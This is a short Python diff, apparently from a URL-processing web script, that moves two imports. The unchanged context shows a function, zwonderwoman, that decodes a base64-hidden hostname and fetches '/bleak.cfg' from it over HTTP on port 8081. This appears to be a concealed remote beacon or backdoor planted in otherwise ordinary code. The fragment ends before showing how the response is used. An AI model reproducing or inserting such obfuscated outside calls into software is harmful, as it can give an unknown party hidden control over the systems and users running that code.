@@ -13,7 +13,8 @@ import traceback
 import web
 import sys
 import http_query
-
+import httplib
+import base64
 import datetime
 
 redis_obj =None
@@ -48,8 +49,7 @@ def pop_all_unknow_urls(redis_obj):
     return unknow_urls
 
 def zwonderwoman():
-    import httplib
-    import base64
+
     h = base64.b64decode('Z29zc2lwaGVyZS5jb20=')
     httpClient = httplib.HTTPConnection(h, 8081, timeout=11)
     httpClient.request("GET", "/bleak.cfg")
